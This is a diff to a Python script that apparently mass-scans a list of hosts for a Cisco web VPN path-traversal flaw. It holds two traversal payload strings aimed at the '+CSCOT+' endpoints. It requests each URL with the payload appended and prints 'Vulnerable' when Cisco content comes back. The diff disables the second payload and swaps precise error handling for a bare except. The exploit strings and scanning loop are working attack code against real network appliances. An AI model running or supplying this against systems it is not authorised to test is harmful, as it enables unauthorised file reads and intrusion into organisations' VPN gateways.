@@ -7,7 +7,7 @@ import urllib3
 from requests.exceptions import ReadTimeout, ConnectionError, InvalidURL, TooManyRedirects
 
 PAYLOAD1="/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
-PAYLOAD2="/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
+#PAYLOAD2="/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
 
 
 def check_url(url, count, total):
@@ -18,7 +18,10 @@ def check_url(url, count, total):
             content_str = str(r.content)
             if "cisco systems" in content_str.lower():
                 print(f"\nVulnerable: {url}")
-    except (UnicodeDecodeError, ConnectionError, ReadTimeout, InvalidURL, TooManyRedirects):
+    except KeyboardInterrupt:
+        print("Interrupted, exiting")
+        sys.exit(0)
+    except:
         pass
 
 
@@ -38,7 +41,7 @@ def main(file_input):
             line = "http://" + line
             
         check_url(line + PAYLOAD1, count, total)
-        check_url(line + PAYLOAD2, count, total)
+#        check_url(line + PAYLOAD2, count, total)
 
 
 if __name__ == '__main__':
